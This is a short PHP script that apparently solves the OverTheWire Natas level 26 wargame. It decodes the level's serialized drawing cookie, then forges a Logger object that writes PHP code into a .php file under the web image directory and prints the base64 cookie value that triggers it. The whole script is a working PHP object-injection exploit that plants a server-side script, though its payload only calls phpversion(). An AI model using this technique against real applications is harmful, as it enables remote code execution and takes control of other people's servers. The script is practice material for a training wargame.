<?php
  /* Nice print of the drawing cookie */
  $drawing = 'YTozOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjM6IjE0MCI7czoyOiJ5MiI7czozOiIxNDAiO31pOjE7YTo0OntzOjI6IngxIjtzOjM6IjE1MCI7czoyOiJ5MSI7czozOiIxNTAiO3M6MjoieDIiO3M6MjoiMTAiO3M6MjoieTIiO3M6MjoiMTAiO31pOjI7YTo0OntzOjI6IngxIjtzOjE6IjUiO3M6MjoieTEiO3M6MjoiMTAiO3M6MjoieDIiO3M6MjoiMTAiO3M6MjoieTIiO3M6MjoiMjAiO319';
  print_r(unserialize(base64_decode($drawing)));

  /* Creating my own Logger object */
    class Logger {
        /* private $initMsg; */
        private $exitMsg;
        private $logFile;
      
        function __construct(){
            // initialise variables
            /* $this->initMsg="UMPHACK\n"; */
            $this->exitMsg="<?php phpversion(); ?>\n";
            $this->logFile="/var/www/natas/natas26/img/umphack.php";
        }
    }

    $o = new Logger();
    print "Crafted logger object. Set this for the drawing cookie:\n";
    print base64_encode(serialize($o))."\n";

?>
